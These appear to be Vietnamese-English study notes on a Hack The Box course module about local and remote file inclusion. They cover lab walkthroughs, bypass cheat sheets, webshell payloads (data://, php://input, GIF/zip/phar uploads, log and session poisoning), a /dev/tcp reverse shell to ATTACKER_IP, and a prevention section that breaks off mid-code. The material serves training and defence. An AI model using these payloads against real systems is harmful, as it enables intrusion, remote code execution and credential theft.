---
title: "Module 16: File Inclusion"
date: 2026-07-07 14:04:51 +0700
categories: [hack-the-box, web-penetration-tester-path]
tags: [ctf-challenges, red-team, htb, cwes]
---

Useful command
```shell
curl -s 'http://154.57.164.76:30421/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini' -o /tmp/resp.html 
cat /tmp/resp.html | grep -oP '[A-Za-z0-9+/=]{100,}' | head -5
```
## SECTION 1: Introduction
### 1. Bản chất lỗ hổng

LFI xảy ra khi ứng dụng dùng **user-controlled parameter** để load file động mà **không sanitize input** — phổ biến nhất ở templating engine (`?page=about`, `?language=en`).

### 2. Điểm yếu theo ngôn ngữ

| Framework  | Hàm nguy hiểm                                        | Ghi chú                              |
| ---------- | ---------------------------------------------------- | ------------------------------------ |
| **PHP**    | `include()`, `require()`, `file_get_contents()`      | `include()` hỗ trợ cả remote URL     |
| **NodeJS** | `fs.readFile()`, `res.render()`                      | `render()` có thể execute            |
| **Java**   | `include`, `import`                                  | `import` hỗ trợ remote URL + execute |
| **.NET**   | `Response.WriteFile()`, `@Html.Partial()`, `include` | `include` execute được               |

---

### 3. Phân biệt Read vs Execute

```
Read only  → Leak source code, credentials, config files
Execute    → RCE (kết hợp log poisoning, php wrapper, v.v.)
Remote URL → RFI (Remote File Inclusion) nếu server cho phép
```

---

### 4. Impact theo cấp độ

```
LFI (read)   → source code leak → credentials → pivot
LFI (exec)   → RCE → full backend compromise
RFI (exec)   → load webshell từ attacker-controlled server
```

---

### 5. Quick Attack Vector (PHP LFI example)

python

```python
# Path traversal cơ bản
payloads = [
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",        # filter bypass
    "%2F%2F..%2F..%2Fetc%2Fpasswd",       # URL encode
    "php://filter/convert.base64-encode/resource=/etc/passwd",  # wrapper
]
```

---

**Key takeaway:** Ưu tiên xác định hàm nào đang dùng → nó có **execute** không → có cho **remote URL** không → chọn attack path phù hợp (LFI read / LFI→RCE / RFI).
List function and their ability
|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|`file_get_contents()`|✅|❌|✅|
|`fopen()`/`file()`|✅|❌|❌|
|**NodeJS**||||
|`fs.readFile()`|✅|❌|❌|
|`fs.sendFile()`|✅|❌|❌|
|`res.render()`|✅|✅|❌|
|**Java**||||
|`include`|✅|❌|❌|
|`import`|✅|✅|✅|
|**.NET**||||
|`@Html.Partial()`|✅|❌|❌|
|`@Html.RemotePartial()`|✅|❌|✅|
|`Response.WriteFile()`|✅|❌|❌|
|`include`|✅|✅|✅|
## SECTION 2: Local File Inclusion

### 1. Basic LFI

Input trực tiếp vào `include()` không có gì thêm vào:

```php
include($_GET['language']);  // vulnerable
```

```
?language=/etc/passwd          # Linux
?language=C:\Windows\boot.ini  # Windows
```

---

### 2. Path Traversal

Server prepend directory vào input:

```php
include("./languages/" . $_GET['language']);
```

```
?language=../../../../etc/passwd
# Luôn thêm nhiều ../ hơn cần — nếu đã ở / thì không bị break
# Tính nhanh: /var/www/html/ → 3 tầng → ../../../
```

---

### 3. Filename Prefix Bypass

Server prepend string vào tên file:

php

```php
include("lang_" . $_GET['language']);
# → lang_../../../etc/passwd  ❌ invalid
```

Fix bằng cách prefix `/`:

```
?language=/../../../etc/passwd
# → lang_/ treated as dir → traverse bình thường ✅
```

---

#### 4. Appended Extension Bypass

Server tự append `.php`:

php

```php
include($_GET['language'] . ".php");
# → /etc/passwd.php  ❌
```

> Sẽ có kỹ thuật bypass riêng ở section sau (PHP wrappers, null byte, v.v.)

---

#### 5. Second-Order Attack

Không exploit trực tiếp qua parameter — **poison dữ liệu vào DB trước**, function khác sẽ trigger:

```
[Register] username = ../../../etc/passwd
           ↓
[Avatar load] /profile/../../../etc/passwd/avatar.png
              → LFI triggered gián tiếp
```

Đây là lý do developers hay bỏ sót — họ sanitize input form nhưng **trust data từ DB**.

---

#### 6. Cheat sheet tổng hợp

| Tình huống          | Payload                          |
| ------------------- | -------------------------------- |
| Include trực tiếp   | `/etc/passwd`                    |
| Có prefix directory | `../../../../etc/passwd`         |
| Có prefix string    | `/../../../etc/passwd`           |
| Có append extension | → dùng PHP wrapper (section sau) |
| Second-order        | Poison username/profile field    |

#### Question 1

Using the file inclusion find the name of a user on the system that starts with "b".
  
Access the page
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-bb70f069dd7ac2a23edbfbec188fb678.png)

Finding attack surfaces

![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-3e46651b629d1e67dc5dfa022079d7b6.png)

Confirm the LFI

![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-5e64f29aa32ba3dae57c767abacc2de0.png)

Identify the user that start with b
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-c15d9ce602a5d7a426bde0ec012a081a.png)
#### Question 2
Submit the contents of the flag.txt file located in the /usr/share/flags directory.
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-988eb149be33f6b11fb976509169d796.png)

## SECTION 3: Basic Bypasses

### 1. Non-Recursive Filter Bypass

Server dùng `str_replace` một lần duy nhất → không recursive:

```php
$language = str_replace('../', '', $_GET['language']);
# ....// → remove ../ → còn lại ../  ✅
```

```
# Các dạng bypass:
....//....//....//etc/passwd
..././..././..././etc/passwd
....\/....\/....\/etc/passwd
....////....////etc/passwd
```

---

### 2. URL Encoding Bypass

Filter chặn ký tự `.` và `/` → encode toàn bộ:

```
../  →  %2e%2e%2f
../../../../etc/passwd  →  %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64

# Double encode nếu server decode 2 lần:
%2e → %252e
%2f → %252f
```

> Dùng **Burp Decoder** để encode nhanh, nhớ encode cả dấu chấm.

---

#### 3. Approved Path Bypass

Server dùng `preg_match` kiểm tra path phải bắt đầu bằng `./languages/`:

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language']))
```

```
# Start với approved path rồi traverse ra ngoài:
?language=./languages/../../../../etc/passwd

# Kết hợp encode nếu cần:
?language=./languages/..%2f..%2f..%2fetc%2fpasswd
```

---

### 4. Appended Extension Bypasses (PHP cũ)

#### Path Truncation — PHP < 5.3/5.4 (giới hạn 4096 ký tự)

bash

```bash
# Generate payload tự động:
echo -n "non_existing_dir/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done

# Kết quả: .php bị truncate sau ký tự thứ 4096
?language=non_existing_dir/../../../etc/passwd/./././[x2048]
```

#### Null Byte — PHP < 5.5

```
?language=../../../../etc/passwd%00
# Path thực tế: /etc/passwd%00.php → truncate tại null byte → /etc/passwd ✅
```

---

#### 5. Bypass Matrix tổng hợp

|Filter|Bypass|
|---|---|
|`str_replace('../')`|`....//` hoặc `..././`|
|Chặn `.` `/`|URL encode `%2e%2e%2f`|
|`preg_match` approved path|Prefix `./languages/` rồi traverse|
|Append `.php` (PHP < 5.3)|Path truncation 4096 chars|
|Append `.php` (PHP < 5.5)|Null byte `%00`|
|Kết hợp nhiều filter|Chain: approved path + encode|
  

#### Question 1
The above web application employs more than one filter to avoid LFI exploitation. Try to bypass these filters to read /flag.txt
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-a69f8ce1db719cc35f4cf44ac9864773.png)
## SECTION 4: PHP Filters

### 1. Tại sao cần PHP Wrappers?

LFI thông thường với file `.php` → server **execute** file thay vì hiển thị source → output rỗng hoặc rendered HTML. PHP Wrappers cho phép intercept stream trước khi execute.

---

### 2. Cú pháp php://filter

```
php://filter/read=<filter>/resource=<file>
```

|Parameter|Mô tả|
|---|---|
|`read`|Filter áp dụng lên stream|
|`resource`|File target (không cần `.php` nếu server tự append)|

---

### 3. Source Code Disclosure — Base64 Filter

```
# Đọc config.php (server tự append .php):
?language=php://filter/read=convert.base64-encode/resource=config

# Đọc file chỉ định rõ extension:
?language=php://filter/read=convert.base64-encode/resource=/etc/passwd
```

Decode output:

bash

```bash
echo 'PD9waHAK...SNIP...' | base64 -d

# Hoặc pipe thẳng nếu biết URL:
curl -s "http://TARGET/index.php?language=php://filter/read=convert.base64-encode/resource=config" \
  | grep -oP '[A-Za-z0-9+/=]{20,}' | base64 -d
```

---

### 4. Workflow khai thác thực tế

bash

```bash
# Bước 1: Fuzz PHP files
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
     -u http://TARGET/FUZZ.php \
     -mc 200,301,302,403   # Đừng bỏ 403 — LFI vẫn đọc được

# Bước 2: Dump source từng file
for file in index config login admin; do
  echo "[*] Reading $file.php"
  curl -s "http://TARGET/index.php?language=php://filter/read=convert.base64-encode/resource=$file" \
    | grep -oP '[A-Za-z0-9+/=]{50,}' \
    | base64 -d > "leaked_${file}.php"
done

# Bước 3: Grep credentials
grep -Ei "(password|passwd|secret|key|db_|api_)" leaked_*.php
```

---

## 5. Các filter hữu ích khác

```
# String filters
php://filter/read=string.rot13/resource=config

# Chain nhiều filter:
php://filter/read=string.tolower|convert.base64-encode/resource=config

# Compression (bypass WAF đơn giản):
php://filter/read=zlib.deflate|convert.base64-encode/resource=config
# Decode:
python3 -c "import zlib,base64; print(zlib.decompress(base64.b64decode('...')))"
```

---

### 6. Tóm tắt attack path

```
LFI found
    ↓
php://filter/base64-encode → dump .php source
    ↓
Tìm credentials / DB keys / API keys / references sang file khác
    ↓
Fuzz thêm file ẩn → lặp lại
    ↓
Nếu tìm được upload endpoint / log path → leo thang RCE
```

#### Question 1

Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer.
using ffuf to find other script that existed on the server 
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-a6841a7ec8522c07e9235af5343bac36.png)Read the configure.php
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-b218acd524b495bac9d3ea243f13255d.png)![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-a101f44f07751f39806460500d28a020.png)

## SECTION 5: PHP WRAPPER

### 1. Check điều kiện tiên quyết

bash

```bash
# Đọc php.ini qua LFI + base64 filter:
curl -s "http://TARGET/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" \
  | grep -oP '[A-Za-z0-9+/=]{20,}' \
  | base64 -d | grep -E "allow_url_include|expect"

# Kết quả cần thấy:
# allow_url_include = On   → mở data:// và php://input
# extension=expect         → mở expect://
```

---

### 2. data:// Wrapper → RCE

**Yêu cầu:** `allow_url_include = On`

bash

```bash
# Encode webshell:
echo '<?php system($_GET["cmd"]); ?>' | base64
# → PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==

# Fire:
curl -s "http://TARGET/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id"
```

python

```python
# Python PoC:
import requests, base64

shell = base64.b64encode(b'<?php system($_GET["cmd"]); ?>').decode()
r = requests.get(f"http://TARGET/index.php",
    params={"language": f"data://text/plain;base64,{shell}", "cmd": "id"})
print(r.text)
```

---

### 3. php://input Wrapper → RCE

**Yêu cầu:** `allow_url_include = On` + endpoint nhận POST

bash

```bash
curl -s -X POST \
  --data '<?php system($_GET["cmd"]); ?>' \
  "http://TARGET/index.php?language=php://input&cmd=id"

# Nếu chỉ nhận POST (không có $_REQUEST), nhúng command thẳng:
curl -s -X POST \
  --data '<?php system("id"); ?>' \
  "http://TARGET/index.php?language=php://input"
```

---

### 4. expect:// Wrapper → RCE trực tiếp

**Yêu cầu:** extension `expect` được load (hiếm, nhưng có)

bash

```bash
# Test luôn không cần check:
curl -s "http://TARGET/index.php?language=expect://id"
curl -s "http://TARGET/index.php?language=expect://whoami"
curl -s "http://TARGET/index.php?language=expect://cat+/etc/passwd"
```

---

### 5. So sánh 3 wrappers

|Wrapper|Yêu cầu|Method|Độ phổ biến|
|---|---|---|---|
|`data://`|`allow_url_include=On`|GET|★★★★|
|`php://input`|`allow_url_include=On`|POST|★★★★|
|`expect://`|Extension riêng|GET|★★|

---

### 6. Reverse shell sau khi có RCE

bash

```bash
# Payload rev shell qua data://:
CMD="bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
ENCODED=$(echo "<?php system(base64_decode('$(echo $CMD | base64 -w0)')); ?>" | base64 -w0)

curl -s "http://TARGET/index.php?language=data://text/plain;base64,$ENCODED"
```

Question 1
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-c6942e3273282b4c5b9923ff09f8b946.png)

![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-95d9422eb1bd64e1ad60ee00e6c29d93.png)

Check for flag

![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-6180a56cef335a62429e4594ac826227.png)![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-a82510d5014352175c914e8b04998f80.png)

## SECTION 6: Remote File Inclusion (RFI)

### 1. LFI vs RFI

- Mọi RFI đều là LFI, nhưng LFI **không nhất thiết** là RFI
- RFI bị disable mặc định trên hầu hết web server hiện đại
- PHP yêu cầu `allow_url_include = On`

**Hàm hỗ trợ Remote URL:**

|Function|Execute|Remote URL|
|---|---|---|
|PHP `include()`/`include_once()`|✅|✅|
|PHP `file_get_contents()`|❌|✅|
|Java `import`|✅|✅|
|.NET `include`|✅|✅|
|.NET `@Html.RemotePartial()`|❌|✅|

---

### 2. Verify RFI

```
# Test bằng localhost trước — tránh bị firewall block:
?language=http://127.0.0.1:80/index.php
```

> ⚠️ Không include chính `index.php` từ remote — gây **recursive loop → DoS**

---

### 3. RCE qua HTTP

bash

```bash
# Tạo webshell:
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Host server:
sudo python3 -m http.server 80   # dùng port 80/443 — thường được whitelist

# Trigger RFI:
?language=http://<OUR_IP>/shell.php&cmd=id
```

> 💡 Nếu server tự append `.php` → bỏ `.php` khỏi tên file khi gọi

---

### 4. RCE qua FTP

bash

```bash
# Dùng khi HTTP bị WAF/firewall block:
sudo python -m pyftpdlib -p 21

# Trigger:
?language=ftp://<OUR_IP>/shell.php&cmd=id

# Nếu cần auth:
?language=ftp://user:pass@<OUR_IP>/shell.php&cmd=id
```

> 💡 PHP mặc định auth anonymous với FTP

---

### 5. RCE qua SMB — Windows only

bash

```bash
# Không cần allow_url_include — Windows treat SMB như local file
impacket-smbserver -smb2support share $(pwd)

# Trigger bằng UNC path:
?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

> ⚠️ SMB qua internet thường bị block — hiệu quả nhất khi **cùng network**

---

### 6. Attack Decision Tree

```
LFI found
    ↓
Check allow_url_include = On?
    ├── Yes → thử HTTP → FTP (nếu HTTP bị block)
    └── No  → Windows server? → SMB (không cần allow_url_include)
                └── Linux? → quay lại LFI→RCE (log poison, php wrapper)
```

---

### 7. SSRF bonus

Nếu hàm **không execute** (chỉ read remote URL) → vẫn khai thác được qua SSRF:

```
?language=http://127.0.0.1:8080/admin
?language=http://127.0.0.1:3000/internal-api
# Enumerate internal ports/services
```
  
#### Question 1

Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in /
Confirm that the page got LFI
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-2040292bfbf5b6f1fc60a2bd2acaa23c.png)
Confirm RFI
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-8b8c7eda210561192a70f41b0f0535d9.png)

Get the flag

![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-8b590728a3dfda62510d12362fc9c0d3.png)
## SECTION 7: LFI and File Uploads
#### Điều kiện

- Upload form **không cần** vulnerable — chỉ cần cho phép upload
- Hàm LFI phải có **Execute** capability (`include()`, `require()`, `res.render()`, v.v.)
- Extension/content type không quan trọng — PHP execute dựa trên **LFI include**, không phải tên file

---

### 1. Malicious Image Upload (phổ biến nhất)

bash

```bash
# Tạo file ảnh giả chứa webshell — GIF magic bytes để bypass content-type check:
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

# Upload lên profile/avatar → inspect source tìm path:
# <img src="/profile_images/shell.gif">

# Trigger qua LFI:
?language=./profile_images/shell.gif&cmd=id
```

> 💡 GIF dùng vì magic bytes là ASCII (`GIF8`) — dễ nhúng. Các format khác cần binary magic bytes phải URL encode.

> ⚠️ Nếu LFI có prefix directory → `../` ra rồi chỉ vào đúng path upload

---

### 2. Zip Upload — `zip://` wrapper

bash

```bash
# Tạo webshell → zip lại → đổi tên thành .jpg để bypass upload filter:
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.jpg shell.php

# Trigger — dùng %23 thay cho # (URL encode):
?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

> ⚠️ `zip://` không enabled mặc định — fallback nếu method 1 fail  
> ⚠️ Một số upload form vẫn detect zip qua content-type dù đổi tên

---

### 3. Phar Upload — `phar://` wrapper

bash

```bash
# Bước 1: Tạo shell.php tạo ra phar:
cat > shell.php << 'EOF'
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
EOF

# Bước 2: Compile → đổi tên:
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg

# Bước 3: Upload → Trigger — %2F thay cho /:
?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

---

### 4. So sánh 3 phương pháp

|Method|Độ tin cậy|Yêu cầu|Bypass upload filter|
|---|---|---|---|
|Malicious Image (`GIF8`)|★★★★★|Bất kỳ|✅ dễ|
|`zip://`|★★★|zip wrapper enabled|⚠️ tùy server|
|`phar://`|★★★|phar wrapper|⚠️ tùy server|

---

### 5. Tìm đường dẫn file upload nếu không biết

bash

```bash
# Fuzz thư mục upload:
ffuf -w /opt/useful/seclists/Discovery/Web-Content/common.txt:FUZZ \
     -u http://TARGET/FUZZ \
     -mc 200,301,302,403

# Fuzz tên file sau khi biết thư mục:
ffuf -w /opt/useful/seclists/Discovery/Web-Content/common.txt:FUZZ \
     -u http://TARGET/profile_images/FUZZ.gif \
     -mc 200
```

---

### 6. Attack Flow

```
Upload form tồn tại?
    ↓
Upload GIF8 + webshell → tìm path từ page source / fuzz
    ↓
LFI include path → RCE
    ↓
Fail? → thử zip:// → thử phar://
```
#### Question 1
Use any of the techniques covered in this section to gain RCE and read the flag at /
Create malicious file gif.
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-6e29375900c6f5ce339dc516b6465a49.png)

Upload it
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-4d5f6fcce500895dff18e07822b21948.png)

Using LFI to execute the shell
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-25f5f30d05f4c9510a6ad6de10607541.png)

Get the flag
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-b8ada3c1c1edde460ae96baf66f4851f.png)

## SECTION 8: Log Poisoning

### Cơ chế

Ghi PHP code vào field ta kiểm soát → field đó được ghi vào log file → LFI include log file → PHP execute. Yêu cầu hàm LFI có **Execute** privilege (`include()`, `require()`, `res.render()`, `import`, .NET `include`).

---

### 1. PHP Session Poisoning

bash

```bash
# Bước 1: Lấy PHPSESSID từ browser (DevTools → Cookies)
# VD: PHPSESSID = nhhv8i0o6ua4g88bkdl9u1fdsd

# Bước 2: Đọc session file qua LFI:
?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
# Linux: /var/lib/php/sessions/sess_<PHPSESSID>
# Windows: C:\Windows\Temp\sess_<PHPSESSID>

# Bước 3: Xác nhận field nào ta control được
# VD: thấy "page" chứa giá trị từ ?language= → controllable ✅

# Bước 4: Poison session bằng webshell (URL encoded):
?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
# Tức là: <?php system($_GET["cmd"]); ?>

# Bước 5: Include session file + execute cmd:
?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

> ⚠️ Mỗi lần include sẽ **overwrite** session file → phải poison lại trước mỗi lần dùng. Ideal: dùng RCE để ghi permanent webshell ra web directory hoặc bắn reverse shell ngay.

---

### 2. Apache / Nginx Log Poisoning

**Vị trí log mặc định:**

| Server | Linux                         | Windows                 |
| ------ | ----------------------------- | ----------------------- |
| Apache | `/var/log/apache2/access.log` | `C:\xampp\apache\logs\` |
| Nginx  | `/var/log/nginx/access.log`   | `C:\nginx\log\`         |

**Quyền đọc:**

- Nginx: low-priv user (`www-data`) đọc được ✅
- Apache: cần `root`/`adm` group — trừ server cũ/misconfigured ⚠️

bash

```bash
# Bước 1: Verify đọc được log không:
?language=/var/log/apache2/access.log

# Bước 2: Poison User-Agent bằng curl:
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
curl -s "http://TARGET/index.php" -H @Poison

# Hoặc inline:
curl -s "http://TARGET/index.php" \
  -H 'User-Agent: <?php system($_GET["cmd"]); ?>'

# Bước 3: Include log + execute:
?language=/var/log/apache2/access.log&cmd=id
```

> 💡 Không nhất thiết phải poison qua LFI request — **bất kỳ request nào** đến server đều được ghi vào access.log.

> ⚠️ Log file rất lớn → load chậm hoặc crash server trên môi trường production → dùng thận trọng.

---

### 3. /proc/ Poisoning — Fallback khi không đọc được log

bash

```bash
# User-Agent cũng xuất hiện trong /proc/
?language=/proc/self/environ
?language=/proc/self/fd/0   # thử N từ 0-50
?language=/proc/self/fd/1
# ...
```

> ⚠️ Các file `/proc/` thường chỉ đọc được bởi privileged user.

---

### 4. Other Service Log Poisoning

| Log file              | Cách poison                                |
| --------------------- | ------------------------------------------ |
| `/var/log/sshd.log`   | SSH login với username = PHP code          |
| `/var/log/mail`       | Gửi email chứa PHP code trong subject/body |
| `/var/log/vsftpd.log` | FTP login với username = PHP code          |

**Workflow chung:**

bash

```bash
# SSH log poisoning example:
ssh '<?php system($_GET["cmd"]); ?>'@TARGET
# → sai password nhưng username đã được ghi vào sshd.log

# Include log:
?language=/var/log/sshd.log&cmd=id
```

> Nguyên tắc: **bất kỳ log nào** ghi lại field ta control + ta đọc được qua LFI → đều có thể poison.

---

### 5. LFI Wordlist — Fuzz log path không chuẩn

bash

```bash
# Khi log không ở vị trí mặc định:
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt:FUZZ \
     -u "http://TARGET/index.php?language=FUZZ" \
     -mc 200 \
     --fs <default_response_size>
```

---

### 6. Attack Decision Tree

```
LFI + Execute confirmed
        ↓
Đọc được /var/log/apache2/access.log?
    ├── Yes → Apache Log Poisoning (User-Agent)
    └── No  → Nginx log? → /proc/self/environ? → SSH/FTP/Mail log?
        ↓
Không đọc được log nào?
    └── PHP Session Poisoning (luôn có PHPSESSID)
        ↓
Có upload form?
    └── GIF8 webshell upload → LFI include
```

#### Question 1
Use any of the techniques covered in this section to gain RCE, then submit the output of the following command: pwd

php session poisoning

Confirm that we can access to the session file
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-646e3472cf49ea38fd13d1e28299e30f.png)

Poison the languages parameter with php shell
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-7eb319f2a8a5081acd5ce06fb51fb2df.png)

access the session file again to get the command result
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-e2a88d305d48a0f78089f204441ea25f.png)

![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-1794f9142f79fb5e92d44dfd9a7260e1.png)

#### Question 2
Try to use a different technique to gain RCE and read the flag at /
Log poisoning
Check that if we can access to webserver's log files
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-1e7dafe86412a808fd4a2723cc2b3131.png)

Send payload with poisoned user-agent
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-1a57325b7db8986ae8ef037e6893c6b9.png)

Access and get the flag
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-0dc3e867c40fa09322fab20ddd04fe98.png)

## SECTION 9: Automated Scanning

### 1. Fuzz Hidden Parameters

Form thông thường đã được test kỹ — nhưng **hidden GET/POST parameters** thường bị bỏ qua và ít được bảo vệ hơn.

bash

```bash
# Fuzz GET parameters ẩn:
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -u 'http://TARGET/index.php?FUZZ=value' \
     -fs <default_size>

# Tham khảo list LFI params phổ biến hơn:
# https://book.hacktricks.xyz/pentesting-web/file-inclusion#top-25-parameters
```

---

### 2. Fuzz LFI Payloads

bash

```bash
# Wordlist tốt nhất: LFI-Jhaddix.txt — chứa cả bypass + common files:
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
     -u 'http://TARGET/index.php?language=FUZZ' \
     -fs <default_size>

# Output mẫu — các payload hoạt động:
# ..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd        [200]
# ../../../../../../../../../../../../etc/hosts  [200]
# /%2e%2e/%2e%2e/%2e%2e/etc/passwd              [200]
```

> 💡 Sau khi ffuf tìm được payload → **manual verify** để confirm và xem content thực sự.

---

### 3. Fuzz Server Webroot Path

Cần khi không biết absolute path để locate file upload qua LFI.

bash

```bash
# Linux:
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
     -u 'http://TARGET/index.php?language=../../../../FUZZ/index.php' \
     -fs <default_size>

# Windows:
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-windows.txt:FUZZ \
     -u 'http://TARGET/index.php?language=../../../../FUZZ/index.php' \
     -fs <default_size>

# Kết quả mẫu:
# /var/www/html/    [200]
```

---

### 4. Fuzz Server Logs & Config Paths

bash

```bash
# Dùng LFI-Jhaddix.txt (nhanh, đủ dùng):
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
     -u 'http://TARGET/index.php?language=../../../../FUZZ' \
     -fs <default_size>

# Precise hơn — dùng dedicated wordlist (cần download thêm):
# Linux:  https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
# Windows: https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows

ffuf -w ./LFI-WordList-Linux:FUZZ \
     -u 'http://TARGET/index.php?language=../../../../FUZZ' \
     -fs <default_size>
```

---

### 5. Đọc Config để tìm Log Path — Manual Chain

bash

```bash
# Bước 1: Đọc apache2.conf → tìm DocumentRoot và LogDir:
curl "http://TARGET/index.php?language=../../../../etc/apache2/apache2.conf"
# → DocumentRoot /var/www/html
# → ErrorLog ${APACHE_LOG_DIR}/error.log
# → CustomLog ${APACHE_LOG_DIR}/access.log

# Bước 2: APACHE_LOG_DIR là biến → đọc envvars để resolve:
curl "http://TARGET/index.php?language=../../../../etc/apache2/envvars"
# → export APACHE_LOG_DIR=/var/log/apache2

# Kết quả: log path = /var/log/apache2/access.log ✅
# → Dùng cho Log Poisoning attack
```

---

### 6. Các file quan trọng thường đọc được

bash

```bash
# System info:
/etc/passwd
/etc/hosts
/etc/hostname
/etc/fstab
/etc/issue.net
/etc/login.defs

# Apache:
/etc/apache2/apache2.conf
/etc/apache2/envvars
/etc/apache2/mods-enabled/status.conf

# Logs (sau khi resolve path):
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
```

---

### 7. LFI Automation Tools

|Tool|Ghi chú|
|---|---|
|`LFISuite`|Phổ biến nhất, nhiều tính năng|
|`LFiFreak`|Có hỗ trợ bypass|
|`liffy`|Nhẹ, đơn giản|

> ⚠️ Hầu hết tool dùng **Python 2** — không còn được maintain. Dùng cho recon nhanh nhưng **không thay thế được manual testing** — tool thường miss nhiều case phức tạp (custom filter, WAF bypass, chained exploits).

---

### 8. Workflow Tổng hợp

```
Tìm thấy LFI parameter
        ↓
Fuzz hidden params → burp-parameter-names.txt
        ↓
Fuzz LFI payloads → LFI-Jhaddix.txt
        ↓
Fuzz webroot → default-web-root-directory-linux.txt
        ↓
Fuzz logs/config → LFI-WordList-Linux
        ↓
Đọc apache2.conf + envvars → resolve log path chính xác
        ↓
Log Poisoning / Session Poisoning / Upload + Include → RCE
```

  

#### Question 1
Fuzz the web application for exposed parameters, then try to exploit it with one of the LFI wordlists to read /flag.txt
Fuzzing parameter
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-2daef8d22c9d5fd8e7dbd133c74131cd.png)
Testing it
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-f57a84c9d0fbebfb64945a7f4a26e471.png)

Testing for lfi
![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-83a62377142077624aa319a53045fbae.png)

![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-1f28a31b0a359720eb0cb4cbe89c5595.png)

Get flag

![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-a52363958c9b9b087df6b0cfe453620e.png)

## SECTION 10: File Inclusions prevention
### 1. Nguyên tắc cốt lõi

**Không bao giờ** đưa user-controlled input trực tiếp vào file inclusion functions (`include()`, `require()`, `file_get_contents()`, v.v.).

---

### 2. Whitelist Input

Khi không thể loại bỏ hoàn toàn dynamic loading, dùng whitelist map thay vì dùng input trực tiếp:

php

```php
// ❌ Vulnerable:
include($_GET['language']);

// ✅ Safe — map input → file:
$whitelist = [
    'en' => '/var/www/html/languages/en.php',
    'es' => '/var/www/html/languages/es.php',
];
$lang = $_GET['language'];
if (array_key_exists($lang, $whitelist)) {
    include($whitelist[$lang]);
} else {
    include($whitelist['en']); // default
}
```

Whitelist có thể triển khai dưới nhiều dạng: DB table (ID → file), switch/case, static JSON map.

---

### 3. Prevent Directory Traversal

**Dùng built-in function thay vì tự implement:**

php

```php
// PHP basename() — chỉ lấy tên file, loại bỏ path:
